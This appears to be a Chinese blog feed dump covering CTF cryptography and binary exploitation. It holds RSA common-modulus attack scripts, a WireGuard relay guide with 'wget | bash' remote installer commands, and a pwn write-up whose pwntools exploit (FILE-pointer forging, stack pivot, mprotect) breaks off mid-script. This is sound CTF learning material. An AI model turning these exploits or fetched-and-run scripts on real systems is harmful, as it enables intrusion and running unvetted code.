href="#4-1-p-与-q-相差过大-小" class="headerlink" title="4. 1 p 与 q 相差过大(小)"></a>4. 1 p 与 q 相差过大(小)</h3><p>这种情况下，可以利用工具爆破出两个大质数 p 与 q 。通常认为长度在 256 bit 一以下，可以在本地利用工具爆破：</p><ul><li><p>yafu 分解</p><p>windows 下载解压即用，<a href="https://sourceforge.net/projects/yafu/">下载地址</a></p></li></ul><p>长度在 712 bit 以下的，可以到在线网站查询一下是否有已经解密的结果：</p><ul><li><p>在线网站分解</p><p><a href="http://factordb.com/">factordb</a></p></li></ul><h3 id="4-2-有多个公钥-n-且有共用素数因子"><a href="#4-2-有多个公钥-n-且有共用素数因子" class="headerlink" title="4.2 有多个公钥 n 且有共用素数因子"></a>4.2 有多个公钥 n 且有共用素数因子</h3><p>可以尝试**利用公约数分解 n **</p><ul><li><p>利用<strong>欧几里得辗转相除法</strong>求解最大公约数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    a = <span class="number">38</span></span><br><span class="line">    b = <span class="number">18</span></span><br><span class="line">    print(gcd(a,b))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></li><li><p>利用<strong>Crypto.Util.number</strong> 库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line">GCD(<span class="number">38</span>,<span class="number">18</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-3-共模攻击"><a href="#4-3-共模攻击" class="headerlink" title="4.3 共模攻击"></a>4.3 共模攻击</h3><p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n，也不需要求解私钥的情况下还原出明文m的值。即：<code>当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2的情况下，解出m。</code></p><p>利用的数学公式：<strong>拓展欧几里得算法</strong>。 python 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#RSA 共模攻击脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">  c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">  c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line">  e1 = <span class="number">464857</span></span><br><span class="line">  e2 = <span class="number">190529</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>库 <strong>gmpy2.gcdext(e1,e2)</strong>  与脚本定义函数相同。</p><h2 id="5-更全面的学习"><a href="#5-更全面的学习" class="headerlink" title="5. 更全面的学习"></a>5. 更全面的学习</h2><ul><li><a href="https://xz.aliyun.com/t/6459#toc-13">深入浅出RSA在CTF中的攻击套路</a></li><li><a href="https://zhuanlan.zhihu.com/p/76228394">CTF—RSA解密学习指南(三)</a></li><li><a href="https://www.freebuf.com/articles/others-articles/166049.html">RSA加密解密原理深度剖析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF密码学中python库应用</title>
      <link href="archives/9cc5252d/"/>
      <url>archives/9cc5252d/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF密码学中python库应用"><a href="#CTF密码学中python库应用" class="headerlink" title="CTF密码学中python库应用"></a>CTF密码学中python库应用</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul><li><p>取 100 bit 长的随机质数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line">getPrime(<span class="number">100</span>)</span><br></pre></td></tr></table></figure></li><li><p>bytes 与 int 互换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line">bytes_to_long(<span class="string">b&#x27;this4bytes&#x27;</span>)</span><br><span class="line">long_to_bytes(<span class="number">123456789</span>)</span><br></pre></td></tr></table></figure></li><li><p>最大公约数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line">GCD(<span class="number">38</span>,<span class="number">18</span>)</span><br></pre></td></tr></table></figure></li><li><p>是否为素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime()</span><br><span class="line">isPrime(<span class="number">17</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><blockquote><p>gmpy2 安装比较麻烦，需要几个额外的运行环境，正常情况下 Ubuntu 没有。详情谷歌百度。</p></blockquote><ul><li><p>初始化一个大整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz</span><br><span class="line">mpz(<span class="number">0x10</span>)</span><br><span class="line">mpz(<span class="number">1234</span>)</span><br></pre></td></tr></table></figure></li><li><p>乘法逆元</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">d = invert(e,phi)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> gmpy2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yafu安装及使用</title>
      <link href="archives/18/"/>
      <url>archives/18/</url>
      
        <content type="html"><![CDATA[<h1 id="yafu安装及使用"><a href="#yafu安装及使用" class="headerlink" title="yafu安装及使用"></a>yafu安装及使用</h1><p>yafu用于自动整数因式分解，<strong>在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值</strong>，原理是使用Fermat方法与Pollard rho方法等。</p><p>如果 p 与 q 相差较大（小），使用 yafu 可以很快分解出来。如果 n 较大，且经过几轮分解都没有得出结果，对于 ctf 题目来说，应该有其他解法。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>yafu 基本覆盖全平台。反正功能一样，选择最简便安装方法–Windows 下安装。</p><p>打开<a href="https://sourceforge.net/projects/yafu/">下载地址</a>，下载后解压即可使用。解压后有两个版本，根据自己系统位数选择（下文使用 x64 版本）。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>使用 cmd 进入到 yafu 所在目录下，或将目录加入到系统环境 PATH 变量，或打开目录文件夹后 shift+右键 选择在此处打开 powershell 。</p></li><li><p>假如要分解因数 6 ，输入命令：<code>.\yafu-x64.exe &quot;factor(6)&quot;</code>。</p></li><li><p>如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。<strong>文件最后一行一定要换行，否则eof; done processing batchfile</strong>。</p><p>运行命令：<code>.\yafu-x64.exe &quot;factor(@)&quot; -batchfile data.txt</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> yafu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组建隧道中转流量（自建IPLC实现落地）</title>
      <link href="archives/e258fe4d/"/>
      <url>archives/e258fe4d/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>突然之前，电报群热烈讨论“隧道中转流量”。非常好奇这是什么技术，本着不懂就问的真理，询问大佬。大佬回答是： 10 块包安装。emmm……生命不息，折腾不止！我自己研究去吧！Google、Baidu 一圈后，在知乎上找到较为贴切问题的帖子，出自大佬 <a href="https://www.zhihu.com/people/icodex">@iCodex</a> （帖子链接见文末）。</p><p>我也是刚刚了解 隧道 方面的知识，如有错误请大佬指出。</p><h2 id="2-IPLC、MPLS、隧道"><a href="#2-IPLC、MPLS、隧道" class="headerlink" title="2. IPLC、MPLS、隧道"></a>2. IPLC、MPLS、隧道</h2><p>我们目标建立的“隧道”概念，与 IPLC 有类似之处，所以先来了解一下。IPLC 粗暴点理解就是专线，直接用网线连接两边用户，不需要经过宽带运营商的机房。具体请看图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200219182140683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>那什么是 MPLS ？实际上我们无法通过软件手段实现物理层面上的两台服务器直接相连，不能完全达到 IPCL 的效果。所以将通过软件手段实现的“类 IPCL ”称为 MPLS。</p><p>至于 隧道 可以理解为一条通过软件构建的虚拟的网线，它直接连接两台服务器的。构建完成的架构图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200219182149210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-进一步了解隧道"><a href="#3-进一步了解隧道" class="headerlink" title="3. 进一步了解隧道"></a>3. 进一步了解隧道</h2><p>就我目前了解，隧道的实现方案有两类：</p><ul><li>使用 Zerotier、WireGuard 。将两台服务器组建在一个内网中，完成隧道部署后，两台机器就相当于在同一 WIFI 下的两台电脑，数据在内网中直接传输。</li><li>使用 Stunnel、GOST 的 TLS 加密隧道。服务器 A 将数据加密后传输，到达服务器 B 后，服务器 B 解密转发到目标服务器（如 油土鳖等）</li></ul><p>第二类方案操作比较简单，理解起来也比较容易，但缺点是 TLS 等加密方案大多都是基于 TCP 的，所以对这类隧道对 UDP 的支持较差。而第一类方案可以较好地支持 UDP 转发，但由于本身是特定的加密协议，特征较为明显，且 WireGuard 基于 UDP，对大陆的网络环境适应性不太好（易受宽带运营商 Qos 影响）。</p><p><em>—-摘选自<a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">利用 GOST 搭建加密中转隧道</a></em></p><p>两者较大的区别就是第一类方案会在每台主机上虚拟出一张网卡，并且虚拟网卡都在同一个网段。是不是有点熟悉？对没有错，就是内网穿透的感觉。</p><h2 id="4-隧道-与-iptables-等转发流量区别"><a href="#4-隧道-与-iptables-等转发流量区别" class="headerlink" title="4. 隧道 与  iptables 等转发流量区别"></a>4. 隧道 与  iptables 等转发流量区别</h2><p>在了解到隧道之前，我印象中中转服务器基本上都是使用 iptables 或者 socat 等工具，直接转发数据包（流量）到落点服务器。 在这种转发方式中，中转服务器没有对数据包进行任何操作（如：加密），仅仅转发数据包到落地服务器。而在 隧道 中的中转服务器有对数据包进行处理。具体请看图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200219182158764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-使用-WireGuard-组建隧道"><a href="#5-使用-WireGuard-组建隧道" class="headerlink" title="5. 使用 WireGuard 组建隧道"></a>5. 使用 WireGuard 组建隧道</h2><p>我选择的是第一种方法搭建 隧道 ，选择的工具是 WireGuard 。如果想了解用第二类方案实现，请看<a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">这篇帖子</a>。</p><p>顺带说一嘴，这个工具可以用做家庭 NAS 的内网穿透。工具还可以选择 Zerotier ，这个带 Web 管理，但服务器在国外，为了更好的链接体验，可以百度一下搭建一个 moon节点 加速。</p><p>WireGuard 服务器客户端一体，依据配置文件区分。<a href="https://www.wireguard.com/install/">官网</a>有详尽的安装命令，实在看不懂英文翻译一下。这里给出大佬们的一键脚本。</p><p>Debian（萌咖）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -qO- &amp;#039;https://moeclub.org/attachment/LinuxShell/wireguard.sh&amp;#039;| bash</span><br></pre></td></tr></table></figure><p>Ubuntu(atrandys)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/atrandys/wireguard/master/wireguard_install_ubuntu.sh &amp;amp;&amp;amp; chmod +x wireguard_install_ubuntu.sh &amp;amp;&amp;amp; ./wireguard_install_ubuntu.sh</span><br></pre></td></tr></table></figure><p>CentOS(atrandys)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;amp;&amp;amp; wget https://raw.githubusercontent.com/atrandys/wireguard/master/wireguard_install.sh &amp;amp;&amp;amp; chmod +x wireguard_install.sh &amp;amp;&amp;amp; ./wireguard_install.sh</span><br></pre></td></tr></table></figure><hr><p>落地服务器我们用作 wireguard 服务端，中转服务器用作 客户端。</p><p><strong>先在 落地服务器 安装</strong>，使用 一键脚本 完成安装后会在 <code>/etc/wireguard</code> 目录下生成有：一对客户端key、一对服务端key、<strong>服务端配置文件</strong>、<strong>客户端配置文件</strong>。</p><p>服务端配置文件：wg0.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey &#x3D; &lt;服务端私钥&gt;</span><br><span class="line"># 组建内网服务端内网地址，NAT机器可能与原有网段冲突，请修改</span><br><span class="line">Address &#x3D; 10.0.0.1&#x2F;24 </span><br><span class="line">PostUp   &#x3D; iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">PostDown &#x3D; iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">ListenPort &#x3D; &lt;监听端口&gt;</span><br><span class="line">DNS &#x3D; 8.8.8.8</span><br><span class="line">MTU &#x3D; 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; &lt;客户端公钥&gt;</span><br><span class="line"># 组建内网服务端内网地址</span><br><span class="line">AllowedIPs &#x3D; 10.0.0.2&#x2F;32</span><br></pre></td></tr></table></figure><p>客户端配置文件：client.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey &#x3D; &lt;客户端私钥&gt;</span><br><span class="line">Address &#x3D; 10.0.0.2&#x2F;24 </span><br><span class="line">DNS &#x3D; 8.8.8.8</span><br><span class="line">MTU &#x3D; 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; &lt;服务端公钥&gt;</span><br><span class="line"># 客户端公网IP:监听端口</span><br><span class="line">Endpoint &#x3D; 173.242.120.211:53115</span><br><span class="line">AllowedIPs &#x3D; 0.0.0.0&#x2F;0, ::0&#x2F;0</span><br><span class="line">PersistentKeepalive &#x3D; 25</span><br></pre></td></tr></table></figure><p>使用 Xshell 之类工具，将 clien.conf 下载到本地电脑待用。以相同方法在 中转服务器 上安装 wireguard 。安装完成后，将本地电脑的 client.conf 上传到中转服务器的 <code>/etc/wireguard</code> 。<strong>记得是覆盖上传！！！覆盖！！！</strong></p><p>如无意外，隧道已经搭建完成了。启动隧道：</p><p>落地服务器（服务端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br></pre></td></tr></table></figure><p>中转服务器（客户端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up cleint</span><br></pre></td></tr></table></figure><p>隧道启动完成，中转服务器流量会经落地服务器发出。可以测试一下：在中转服务器执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl zx2c4.com/ip</span><br></pre></td></tr></table></figure><p>返回的应该落地服务器的IP。至此 隧道中转流量 搭建完成。</p><p>怎么使用？你仅需要在中转服务器上安装 喜闻乐见的程序 ，开启隧道，你全部流量就会最终从落地服务器发出。不信你连接上 喜闻乐见的程序 后，去查查你的IP。</p><h2 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h2><p>使用 隧道 转发流量和使用 iptables 转发流量，速度谁更快？我并没有对比，所以不知道。电报大佬说是 隧道 更快一点，但没有指明是哪种 隧道 方案。毕竟高峰期 TCP 与 UDP 差距是存在的。安全性的话，隧道 进行二次加密比单次加密的 iptables，在理论上安全性更高，毕竟多一次加密等于你家多一道门一样。但是，隧道 加密的特征可能被容易识别出来。</p><p>总结：说了等于没说，你们自己测试去吧。我家境贫寒。</p><h2 id="7-wireguard-常用命令"><a href="#7-wireguard-常用命令" class="headerlink" title="7. wireguard 常用命令"></a>7. wireguard 常用命令</h2><p>使用 <code>/etc/wireguard/</code> 下的配置启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up &amp;lt;配置名&amp;gt;</span><br></pre></td></tr></table></figure><p>关闭&amp;&amp;停止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick down &amp;lt;启动时用的配置名&amp;gt;</span><br></pre></td></tr></table></figure><p>查看运行状态&amp;&amp;链接信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 输入无显示，则为未启动</span></span><br><span class="line">wg show</span><br><span class="line">或</span><br><span class="line">wg</span><br></pre></td></tr></table></figure><h2 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8. 参考链接"></a>8. 参考链接</h2><ul><li><a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">利用 GOST 搭建加密中转隧道</a></li><li><a href="https://icodex.org/2020/02/vps-and-virtual-machines-how-to-get-an-iplc-like-experience/">VPS虚拟机如何自建“iplc”</a></li><li><a href="https://zhuanlan.zhihu.com/p/106004065">教你玩自建“IPLC” 轻松玩落地</a></li><li><a href="https://www.wireguard.com/">WireGuard</a></li><li><a href="https://www.v2ex.com/">还有一个v2ex帖子找不到了就贴官网吧</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 隧道 </tag>
            
            <tag> wireguard </tag>
            
            <tag> 中转流量 </tag>
            
            <tag> IPLC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届百度杯线上初赛 try to pwn</title>
      <link href="archives/34562184/"/>
      <url>archives/34562184/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目涉及：</p><ul><li>伪造文件流（FILE Stream）</li><li>调整栈帧（stack pivot）</li></ul></blockquote><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>题目给的是一个32位静态编译的程序，保护开启情况如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116181500.png"></p><p>程序的大概业务流程是打开名为<code>输入名称+随机数文件的随机内容</code>的文件，然后可以读取并输出这个文件的内容。</p><p>在 welcome 函数读入用户名时，没有限制输入长度，存在缓冲区溢出。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116183003.png"></p><p>变量 x 位于 bss 段，文件指针 dword_80EFA00 也位于 bss 段，与 x 位置关系如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116184722.png"></p><p>存储控制 x 输入内容，可以覆写文件指针 dword_80EFA00。程序最后调用了 fclose ，所以可以更改虚表指针来劫持控制流。</p><p>根据FILE结构，在 bss 段伪造出一个类似的结构，然后控制FILE里面的函数指针，执行任意代码。例如：执行<code>fclose(fileexample)</code>相当于调用 fileexample 这个文件(file)结构体虚表结构的 close 函数指针。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116192212.png"></p><p>成功劫持文件流后，有一次调用机会（顺序执行一遍代码）。题目开启了 NX 保护，不能执行栈上 shellcode 。采取的解决办法是：先调整栈帧、扩充栈空间，使用 mprotect 函数改权限，让新的栈空间有可执行权限。</p><p>:link:<a href="https://blog.csdn.net/roland_sun/article/details/33728955">Linux中mprotect()函数的用法</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;unistd.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;sys/mmap.h&amp;gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>mprotect 地址是用 gdb 加载程序后，print mprotect 查到。（无PIE）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;<span class="comment">#039;./fake&amp;#039;)</span></span><br><span class="line"><span class="comment">#p = remote(&amp;quot;106.75.2.53&amp;quot;,10007)</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x08071fd0</span></span><br><span class="line"><span class="comment"># ROPgadget --binary fake --only &amp;quot;pop|ret&amp;quot;</span></span><br><span class="line">pop_esp_ret = <span class="number">0x080e2b6d</span></span><br><span class="line"><span class="comment"># ROPgadget --binary fake --only &amp;quot;xchg|ret&amp;quot;</span></span><br><span class="line">xchg_esp_eax_ret = <span class="number">0x08048f66</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * 32 # fill up x</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">4</span>) <span class="comment"># FILE Pointer point to fake file</span></span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>) * (<span class="number">148</span> / <span 